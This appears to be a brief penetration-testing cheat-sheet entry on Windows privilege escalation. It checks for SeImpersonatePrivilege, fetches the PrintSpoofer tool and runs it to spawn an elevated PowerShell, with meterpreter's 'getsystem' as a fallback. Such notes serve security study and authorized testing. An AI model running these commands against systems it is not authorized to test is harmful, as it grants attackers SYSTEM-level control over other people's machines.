#If our user has the SeImpersonatePrivilege it maybe vulnerable to PrintSpoofer

whoami /priv #To check our user privileges.

https://github.com/itm4n/PrintSpoofer/releases # To download PrintSpoofer. 

.\PrintSpoofer[32/64].exe -i -c powershell.exe

#If printispoofer doesn't work, we can upgrade our session to a meterpreter session and use 'getsystem' to try to leverage SeImpersonatePrivilege.
